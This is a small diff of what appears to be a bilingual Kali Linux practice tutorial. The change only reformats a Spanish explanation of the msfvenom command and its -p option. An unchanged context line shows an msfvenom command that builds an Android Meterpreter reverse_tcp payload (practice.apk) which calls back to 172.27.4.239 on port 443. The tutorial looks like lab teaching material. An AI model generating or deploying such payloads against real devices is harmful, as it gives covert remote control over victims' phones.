@@ -38,5 +38,5 @@ In this first practice we will use msfvenom to create an application which will 
 ┌──(root㉿CarlosSantos)-[/home/kali]
 └─# `msfvenom -p android/meterpreter/reverse_tcp LHOST=172.27.4.239 LPORT=443 -o practice.apk`
 
-1. *msfvenom: Es el nombre del comando que invoca la herramienta msfvenom.
--p *
+
+1. *msfvenom: Es el nombre del comando que invoca la herramienta msfvenom. **-p***
